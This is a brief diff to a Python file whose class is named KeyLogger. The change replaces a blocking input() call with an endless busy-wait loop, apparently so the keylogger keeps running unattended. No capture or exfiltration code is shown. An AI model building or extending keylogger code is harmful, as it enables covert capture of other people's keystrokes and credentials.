@@ -35,4 +35,6 @@ class KeyLogger():
 if __name__ == '__main__':
     logger = KeyLogger()
     logger.main()
-    input()
+    looper = 0
+    while looper == 0:
+        pass
